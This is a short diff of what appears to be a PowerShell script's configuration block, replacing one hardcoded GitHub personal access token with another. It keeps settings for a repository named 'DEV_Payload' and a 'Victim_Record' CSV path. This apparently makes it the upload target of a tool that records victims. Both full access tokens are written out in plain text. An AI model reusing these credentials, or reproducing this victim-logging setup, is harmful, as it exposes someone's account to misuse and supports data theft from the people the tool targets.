@@ -4,7 +4,7 @@
 # ===============================================
 
 # === CONFIGURATION SETTINGS ===
-$GitHubToken          = "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"
+$GitHubToken          = "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"
 $RepoOwner            = "Umair13303"
 $RepoName             = "DEV_Payload"
 $CsvPathInRepo        = "GitHub_Script/Excel/Victim_Record_GitHub.csv"
